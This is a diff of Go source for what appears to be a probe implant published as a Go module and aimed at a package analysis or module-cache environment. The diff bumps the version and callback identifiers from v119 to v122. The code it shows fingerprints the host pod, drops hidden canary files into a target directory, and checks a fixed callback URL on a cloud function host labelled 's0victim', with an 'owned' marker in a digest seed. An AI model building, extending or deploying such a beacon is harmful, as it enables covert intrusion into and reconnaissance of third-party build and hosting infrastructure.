@@ -31,11 +31,11 @@ var callbackSession string
 var callbackURLSHA256 string
 
 const (
-	expectedOrigin     = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.119-codex"
-	expectedAgent      = "go-cgo-pkgsite-probe-v119-adaptive"
+	expectedOrigin     = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.122-codex"
+	expectedAgent      = "go-cgo-pkgsite-probe-v122-recovery"
 	httpTimeout        = 15 * time.Second
 	sessionLength      = 10 * time.Minute
-	maximumSteps       = 50
+	maximumSteps       = 35
 	maximumBody        = 16 * 1024
 	maximumRead        = 256 * 1024
 	maximumPath        = 512
@@ -440,7 +440,7 @@ func podFingerprint() string {
 }
 
 func initialTranscript(fingerprint string) string {
-	digest := sha256.Sum256([]byte("owned-go-capslock-v119/1\n" + fingerprint))
+	digest := sha256.Sum256([]byte("owned-go-capslock-v122/1\n" + fingerprint))
 	return hex.EncodeToString(digest[:])
 }
 
@@ -1024,7 +1024,7 @@ func runWriteCanary(base string, state *clientState, sequence int) (map[string]a
 	if _, err := rand.Read(random[:]); err != nil {
 		return nil, err
 	}
-	basename := ".go-cgo-v119-" + callbackSession[:8] + "-" + strconv.Itoa(sequence) + "-" + hex.EncodeToString(random[:])
+	basename := ".go-cgo-v122-" + callbackSession[:8] + "-" + strconv.Itoa(sequence) + "-" + hex.EncodeToString(random[:])
 	path := filepath.Join(base, basename)
 	fd, err := syscall.Open(path, syscall.O_WRONLY|syscall.O_CREAT|syscall.O_EXCL|syscall.O_NOFOLLOW|syscall.O_CLOEXEC, 0o600)
 	if err != nil {
@@ -1680,7 +1680,7 @@ func validateRuntimeConfiguration() error {
 	parsed, err := url.Parse(callbackURL)
 	if err != nil || parsed.Scheme != "https" || parsed.Host != "us-central1-s0victim-44547.cloudfunctions.net" ||
 		parsed.User != nil || parsed.Opaque != "" || parsed.RawQuery != "" || parsed.Fragment != "" ||
-		parsed.Path != "/go-cgo-v119-adaptive-codex/v1/session/"+callbackSession {
+		parsed.Path != "/go-cgo-v122-recovery-codex/v1/session/"+callbackSession {
 		return errors.New("invalid fixed callback URL")
 	}
 	digest := sha256.Sum256([]byte(callbackURL))
